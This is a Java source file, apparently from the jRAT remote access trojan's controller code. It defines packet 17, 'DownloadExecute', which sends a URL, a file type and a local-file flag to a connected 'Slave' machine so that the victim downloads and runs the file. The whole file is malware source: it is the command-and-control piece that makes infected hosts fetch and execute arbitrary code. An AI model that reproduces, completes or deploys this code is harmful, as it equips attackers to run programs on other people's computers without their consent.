package jrat.controller.packets.outgoing;

import jrat.controller.Slave;

import java.io.File;


public class Packet17DownloadExecute extends AbstractOutgoingPacket {

	private String url;
	private String filetype;
	private boolean fromLocal;

	public Packet17DownloadExecute(String url, String filetype) {
		this.url = url;
		this.filetype = filetype;
	}
	
	public Packet17DownloadExecute(String url, String filetype, File local) {
		this.url = url;
		this.filetype = filetype;
		this.fromLocal = true;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(url);
		slave.writeLine(filetype);
		slave.writeBoolean(fromLocal);
	}

	@Override
	public short getPacketId() {
		return 17;
	}

}
